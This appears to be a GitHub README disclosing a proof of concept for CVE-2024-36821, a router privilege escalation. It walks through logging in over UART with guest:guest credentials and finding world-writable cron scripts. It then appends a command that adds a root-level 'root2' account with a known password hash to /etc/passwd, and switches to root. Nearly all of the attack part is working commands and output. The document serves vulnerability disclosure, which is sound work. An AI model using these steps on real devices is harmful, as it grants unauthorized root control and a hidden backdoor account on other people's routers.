# CVE-2024-36821
The public reference that contains the minimum require information for the vulnerability covered by CVE-2024-36821

### The original video with PoC you may find on the video -> https://www.youtube.com/watch?v=6vHno0ik7JY

### The PoC:
1. Connect to the router witnin UART conenction
2. Using `guest:guest` credentials, log into the system
3. Using `find / -perm -777 -type f 2>/dev/null` command, find files with read-write-execute permissions:
    ```
    1. /tmp/cron/cron.daily/sysinfo_cleanup.sh
    2. /tmp/cron/cron.daily/devicedb_backup_daily.sh
    3. /tmp/cron/cron.hourly/sysinfo_cleanup.sh
    4. /tmp/cron/cron.every5minute/sysinfo_cleanup.sh
    5. /tmp/cron/cron.everyminute/conntrack_collector.sh
    ```
    <img width="456" alt="Screenshot 2024-06-10 at 20 00 50" src="https://github.com/IvanGlinkin/CVE-2024-36821/assets/64857726/b464856d-e222-493c-a697-1c3fe4cbbd98">

5. Check the owner by `ls -al /tmp/cron/cron.everyminute/conntrack_collector.sh` command
6. Generate the password by `openssl passwd Abracadabra` command
7. Edit `/tmp/cron/cron.everyminute/conntrack_collector.sh`, adding to the end the new generated password:
   ```
   echo "root2:UlPYin76ss0w2:0:0::/:/bin/sh" >> /etc/passwd
   ```
   
    <img width="424" alt="Screenshot 2024-06-10 at 20 05 05" src="https://github.com/IvanGlinkin/CVE-2024-36821/assets/64857726/babb8bae-cc11-49e2-9b76-d45fd26c21d1">

9. Wait for a minute
10. Switch user into root2 by the next command
    ```
    / $ su root2
    Password: Abracadabra
    ~ #
    ```
